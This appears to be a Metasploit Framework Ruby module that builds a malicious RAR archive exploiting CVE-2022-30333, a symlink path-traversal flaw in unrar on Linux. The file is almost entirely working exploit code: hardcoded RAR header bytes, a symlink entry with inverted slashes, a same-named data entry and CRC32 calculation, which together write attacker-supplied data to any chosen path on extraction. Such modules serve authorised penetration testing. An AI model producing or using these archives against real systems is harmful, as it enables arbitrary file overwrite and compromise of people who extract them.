# Encoding: ASCII-8BIT

module Msf
  class Exploit
    module Format
      # The RarSymlinkPathTraversal mixin provides methods for generating a RAR file
      # that exploits CVE-2022-30333, which can write an arbitrary file to an arbitrary
      # location on a Linux filesystem
      module RarSymlinkPathTraversal
        # Encode arbitrary data to be extracted to an arbitrary path on versions of
        # unrar that are affected by CVE-2022-30333
        def encode_as_traversal_rar(symlink_name, target_path, data)
          # Exactly 104 characters isn't allowed because we need to null-terminate
          unless target_path.length < 104
            raise ArgumentError, 'The RAR filename target is too long (max length: 103 characters)'
          end

          # Data and symlink_name don't need to be null-terminated, just padded
          unless data.length <= 4096
            raise ArgumentError, "The RAR file data is too long (max length: 4096 bytes, it was #{data.length})"
          end

          unless symlink_name.length <= 12
            raise ArgumentError, 'The symlink is too long (max length: 12 characters)'
          end

          # Null terminate the path, pad with NUL bytes, and invert the slashes
          symlink_target = (target_path + "\0").gsub('/', '\\')
          symlink_target.concat(rand(255).chr) while symlink_target.length < 104

          symlink_name = symlink_name.ljust(12, "\0")

          # Pad the data to the full length
          data.concat(rand(255).chr) while data.length < 4096

          # Build a RAR file from pieces, filling in the blanks with our payloads.
          # The RAR format is non-free (and complex), so this is the easiest way to
          # build a payload file
          rar = "\x52\x61\x72\x21\x1a\x07\x01\x00\xf3\xe1\x82\xeb\x0b\x01\x05\x07\x00\x06\x01\x01\x80\x80\x80\x00"

          # Create the first section (with the symlink), and attach with its CRC32
          rar_section1 = ''
          rar_section1.concat("\x94\x01\x02\x03\x78\x00\x04\x00\xa0\x08\x00\x00\x00\x00\x80\x00\x00\x0c")
          rar_section1.concat(symlink_name) # Symlink filename
          rar_section1.concat("\x0a\x03\x02\xae\xf0\x37\x1c\x91\x98\xd8\x01\x6c\x05\x02\x00\x68")
          rar_section1.concat(symlink_target)
          rar.concat([Zlib.crc32(rar_section1), rar_section1].pack('Va*'))

          # Create the second section (with the data), and attach with its CRC32
          rar_section2 = ''
          rar_section2.concat("\x28\x02\x03\x0b\x80\x20\x04\x80\x20\x20")
          rar_section2.concat([Zlib.crc32(data)].pack('V'))
          rar_section2.concat("\x80\x00\x00\x0c")
          rar_section2.concat(symlink_name) # Data filename (same as symlink to overwrite it)
          rar_section2.concat("\x0a\x03\x02\x00\x36\xe3\x00\x91\x98\xd8\x01")
          rar.concat([Zlib.crc32(rar_section2), rar_section2].pack('Va*'))

          rar.concat(data)

          # This tail doesn't seem necessary, but I don't want to mess with it
          rar.concat("\x1d\x77\x56\x51\x03\x05\x04\x00")

          rar
        end
      end
    end
  end
end
